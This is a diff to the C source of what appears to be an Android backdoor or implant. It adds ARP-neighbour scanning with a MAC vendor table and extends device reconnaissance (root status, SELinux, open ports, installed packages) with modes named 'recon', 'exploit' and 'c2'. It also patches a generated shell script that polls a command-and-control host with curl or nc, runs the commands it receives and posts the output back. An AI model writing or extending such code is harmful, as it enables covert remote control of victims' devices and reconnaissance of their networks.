@@ -68,7 +68,7 @@
 #include <sys/prctl.h>
 
 #define PROP(k, v)   get_prop(k, v, sizeof(v))
-#define JSON_SIZE    16384
+#define JSON_SIZE    32768
 #define CMD_SIZE     4096
 #define PID_FILE     "/data/local/tmp/._svp"
 #define HTTP_POLL_SH "/data/local/tmp/._svh.sh"
@@ -116,6 +116,125 @@ static void json_esc(char *buf, size_t sz) {
 }
 
 static int fexists(const char *path) { return access(path, F_OK) == 0; }
+
+/* ── OUI vendor lookup ── */
+typedef struct { const char *pfx; const char *vendor; } OuiEntry;
+static const OuiEntry OUI_TABLE[] = {
+    /* Hypervisors */
+    {"00:50:56","VMware"},{"00:0c:29","VMware"},{"08:00:27","VirtualBox"},
+    {"52:54:00","QEMU/KVM"},{"00:16:3e","Xen"},{"02:42:ac","Docker"},
+    {"00:15:5d","Microsoft Hyper-V"},
+    /* Raspberry Pi / IoT */
+    {"b8:27:eb","Raspberry Pi"},{"dc:a6:32","Raspberry Pi"},{"e4:5f:01","Raspberry Pi"},
+    {"28:cd:c1","Raspberry Pi"},{"2c:cf:67","Raspberry Pi"},
+    {"a4:cf:12","Espressif (ESP32/IoT)"},{"24:0a:c4","Espressif (ESP32/IoT)"},
+    {"70:ff:76","Arduino"},
+    /* Google */
+    {"3c:5a:b4","Google"},{"54:60:09","Google"},{"f4:f5:d8","Google"},
+    /* Apple */
+    {"fc:aa:14","Apple"},{"3c:22:fb","Apple"},{"a4:c3:f0","Apple"},
+    {"88:a9:b7","Apple"},{"04:34:f6","Apple"},{"00:17:f2","Apple"},
+    {"ac:bc:32","Apple"},{"f4:f1:5a","Apple"},{"8c:85:90","Apple"},
+    {"78:fd:94","Apple"},{"a8:51:ab","Apple"},{"18:af:61","Apple"},
+    {"f0:99:bf","Apple"},{"28:cf:e9","Apple"},{"9c:f3:87","Apple"},
+    {"d0:03:4b","Apple"},{"40:98:ad","Apple"},{"b8:8d:12","Apple"},
+    {"60:03:08","Apple"},{"bc:92:6b","Apple"},{"04:52:f3","Apple"},
+    {"70:ec:e4","Apple"},{"14:7d:da","Apple"},{"ac:87:a3","Apple"},
+    {"3c:d0:f8","Apple"},{"68:fb:7e","Apple"},{"f0:b4:79","Apple"},
+    /* Samsung */
+    {"00:1a:4b","Samsung"},{"40:b0:76","Samsung"},{"c4:57:6e","Samsung"},
+    {"b4:3a:28","Samsung"},{"78:52:1a","Samsung"},{"98:52:b1","Samsung"},
+    {"00:07:ab","Samsung"},{"a4:23:05","Samsung"},{"f8:77:b8","Samsung"},
+    {"8c:71:f8","Samsung"},{"94:35:0a","Samsung"},{"20:13:e0","Samsung"},
+    {"cc:07:ab","Samsung"},{"e4:92:fb","Samsung"},{"50:01:bb","Samsung"},
+    /* Huawei */
+    {"00:18:82","Huawei"},{"00:e0:fc","Huawei"},{"04:02:1f","Huawei"},
+    {"10:1b:54","Huawei"},{"18:f0:e4","Huawei"},{"2c:ab:00","Huawei"},
+    {"34:cd:be","Huawei"},{"54:89:98","Huawei"},{"68:13:24","Huawei"},
+    {"9c:37:f4","Huawei"},{"ac:e2:15","Huawei"},{"e0:19:1d","Huawei"},
+    /* Xiaomi */
+    {"00:9e:c8","Xiaomi"},{"10:2a:b3","Xiaomi"},{"28:6c:07","Xiaomi"},
+    {"34:80:b3","Xiaomi"},{"50:64:2b","Xiaomi"},{"58:44:98","Xiaomi"},
+    {"64:09:80","Xiaomi"},{"74:23:44","Xiaomi"},{"78:11:dc","Xiaomi"},
+    {"8c:be:be","Xiaomi"},{"f4:8b:32","Xiaomi"},{"fc:64:ba","Xiaomi"},
+    /* OnePlus */
+    {"08:9e:01","OnePlus"},{"14:45:1c","OnePlus"},{"ac:e2:d3","OnePlus"},
+    /* LG */
+    {"00:1e:75","LG"},{"00:aa:70","LG"},{"34:fc:ef","LG"},{"40:b0:fa","LG"},
+    /* Sony */
+    {"00:04:20","Sony"},{"00:13:a9","Sony"},{"10:08:b1","Sony"},
+    {"5c:f3:70","Sony"},{"d8:c4:6a","Sony"},{"f0:7d:68","Sony"},
+    /* Intel */
+    {"00:1b:21","Intel"},{"8c:8d:28","Intel"},{"8c:ec:4b","Intel"},
+    {"a4:34:d9","Intel"},{"f4:4d:30","Intel"},
+    /* Qualcomm / MediaTek */
+    {"00:02:ee","Qualcomm"},{"18:b4:30","Qualcomm"},{"e4:02:9b","Qualcomm"},
+    /* Networking */
+    {"00:09:5b","NETGEAR"},{"20:4e:7f","NETGEAR"},{"a0:21:b7","NETGEAR"},
+    {"00:26:82","TP-Link"},{"f4:f2:6d","TP-Link"},{"50:c7:bf","TP-Link"},
+    {"e8:94:f6","TP-Link"},{"30:de:4b","TP-Link"},
+    {"00:50:ba","D-Link"},{"14:d6:4d","D-Link"},
+    {"00:18:f3","ASUS"},{"04:92:26","ASUS"},{"2c:fd:a1","ASUS"},
+    {"00:1e:e5","Linksys"},{"00:14:bf","Linksys"},
+    {"00:18:18","Juniper"},{"00:1e:13","MikroTik"},{"4c:5e:0c","MikroTik"},
+    {"00:09:0f","Fortinet"},{"00:15:6d","Ubiquiti"},{"04:18:d6","Ubiquiti"},
+    {"24:a4:3c","Ubiquiti"},{"80:2a:a8","Ubiquiti"},
+    {"00:23:24","Fortinet"},{"00:1c:73","Arista"},
+    /* Cisco */
+    {"00:00:0c","Cisco"},{"00:23:7d","Cisco"},{"58:97:bd","Cisco"},
+    {"00:1b:54","Cisco"},{"f8:72:ea","Cisco"},
+    /* Microsoft / HP / Dell */
+    {"00:0d:3a","Microsoft"},{"00:12:5a","Microsoft"},
+    {"00:21:5a","HP"},{"3c:d9:2b","HP"},
+    {"00:14:22","Dell"},{"f8:db:88","Dell"},{"18:66:da","Dell"},
+    /* Amazon / Kindle */
+    {"40:b4:cd","Amazon"},{"44:65:0d","Amazon"},{"68:37:e9","Amazon"},
+    {"74:c2:46","Amazon"},{"a0:02:dc","Amazon"},{"fc:a1:83","Amazon"},
+    {NULL, NULL}
+};
+
+static const char *lookup_oui(const char *mac) {
+    if (!mac || strlen(mac) < 8) return "";
+    for (int i = 0; OUI_TABLE[i].pfx; i++) {
+        if (strncasecmp(mac, OUI_TABLE[i].pfx, 8) == 0)
+            return OUI_TABLE[i].vendor;
+    }
+    return "";
+}
+
+static void scan_neighbors(char *out, size_t outsz) {
+    FILE *f = fopen("/proc/net/arp", "r");
+    if (!f) { snprintf(out, outsz, "[]"); return; }
+
+    char line[256];
+    size_t pos = 0;
+    out[pos++] = '[';
+    int first = 1;
+
+    fgets(line, sizeof(line), f); /* skip header */
+    while (fgets(line, sizeof(line), f)) {
+        char ip[32]={0}, hwtype[8]={0}, flags[8]={0};
+        char mac[24]={0}, mask[8]={0}, dev[16]={0};
+        if (sscanf(line, "%31s %7s %7s %23s %7s %15s",
+                   ip, hwtype, flags, mac, mask, dev) < 4) continue;
+        /* skip incomplete entries and null MACs */
+        if (strcmp(flags,"0x0")==0 || strcmp(flags,"0x00")==0) continue;
+        if (strcmp(mac,"00:00:00:00:00:00")==0) continue;
+
+        const char *vendor = lookup_oui(mac);
+        char entry[256];
+        int n = snprintf(entry, sizeof(entry),
+                         "%s{\"ip\":\"%s\",\"mac\":\"%s\",\"vendor\":\"%s\"}",
+                         first ? "" : ",", ip, mac, vendor[0] ? vendor : "Unknown");
+        if (pos + (size_t)n + 2 >= outsz) break;
+        memcpy(out + pos, entry, n);
+        pos += n;
+        first = 0;
+    }
+    fclose(f);
+    out[pos++] = ']';
+    out[pos] = '\0';
+}
 
 /* TCP connect — returns fd or -1 */
 static int tcp_connect(const char *host, int port) {
@@ -206,13 +325,20 @@ static void build_json(const char *mode) {
     runcmd("ss -tlnp 2>/dev/null | awk 'NR>1{split($4,a,\":\");if(a[2]+0>0)printf a[2]\",\"}'", ports, sizeof(ports));
     PROP("service.adb.tcp.port", adb_tcp);
 
-    /* packages */
+    /* neighbors — ARP table with OUI vendor lookup */
+    static char nbr_buf[4096];
+    scan_neighbors(nbr_buf, sizeof(nbr_buf));
+
+    /* packages — skip in daemon/nohup_loop to avoid blocking boot with pm */
     char pkgs_count[16] = {0}, pkgs[2048] = {0};
-    runcmd("pm list packages 2>/dev/null | wc -l",                               pkgs_count, sizeof(pkgs_count));
-    runcmd("pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\\n' ',' | sed 's/,$//'", pkgs, sizeof(pkgs));
+    int is_oneshot = (strcmp(mode,"recon")==0 || strcmp(mode,"exploit")==0 || strcmp(mode,"c2")==0);
+    if (is_oneshot) {
+        runcmd("pm list packages 2>/dev/null | wc -l",                               pkgs_count, sizeof(pkgs_count));
+        runcmd("pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\\n' ',' | sed 's/,$//'", pkgs, sizeof(pkgs));
+    }
 
     /* termux */
-    int has_termux = fexists("/data/data/com.termux");
+    int has_termux = is_oneshot ? fexists("/data/data/com.termux") : 0;
 
     /* escape */
     json_esc(model,   sizeof(model));
@@ -235,7 +361,8 @@ static void build_json(const char *mode) {
         "},"
         "\"network\":{"
             "\"ip\":\"%s\",\"gateway\":\"%s\","
-            "\"adb_tcp_port\":\"%s\",\"open_ports\":\"%s\""
+            "\"adb_tcp_port\":\"%s\",\"open_ports\":\"%s\","
+            "\"neighbors\":%s"
         "},"
         "\"packages\":{\"count\":%s,\"third_party\":\"%s\"},"
         "\"attack_surface\":{"
@@ -246,7 +373,7 @@ static void build_json(const char *mode) {
         model, mfr, android, sdk,
         patch, chipset, arch, kernel,
         root_status, root_bin, selinux, bootlocked, build,
-        ip, gw, adb_tcp, ports,
+        ip, gw, adb_tcp, ports, nbr_buf,
         pkgs_count, pkgs,
         has_termux ? "true" : "false"
     );
@@ -335,7 +462,7 @@ static void write_http_poll_sh(const char *c2_host, int http_port) {
         "    _CMD=$(_curl -sf --connect-timeout 15 --max-time 20 "
               "\"http://$C2:$HP/cmd\" 2>/dev/null)\n"
         "  else\n"
-        "    _CMD=$(printf 'GET /cmd HTTP/1.0\\r\\nHost: %s\\r\\n\\r\\n' \"$C2\" | "
+        "    _CMD=$(printf 'GET /cmd HTTP/1.0\\r\\nHost: %%s\\r\\n\\r\\n' \"$C2\" | "
               "nc -w10 \"$C2\" \"$HP\" 2>/dev/null | awk '/^\\r?$/{body=1;next} body{print}')\n"
         "  fi\n"
         "  if [ -n \"$_CMD\" ]; then\n"
@@ -345,7 +472,7 @@ static void write_http_poll_sh(const char *c2_host, int http_port) {
                "-H 'Content-Type: text/plain' --data-binary \"$_OUT\" >/dev/null 2>&1\n"
         "    else\n"
         "      _LEN=${#_OUT}\n"
-        "      printf 'POST /result HTTP/1.0\\r\\nHost: %s\\r\\n"
+        "      printf 'POST /result HTTP/1.0\\r\\nHost: %%s\\r\\n"
                "Content-Type: text/plain\\r\\nContent-Length: '"
                "'\"$_LEN\"'\\r\\n\\r\\n'"
                "'\"$_OUT\"' | nc -w10 \"$C2\" \"$HP\" >/dev/null 2>&1\n"
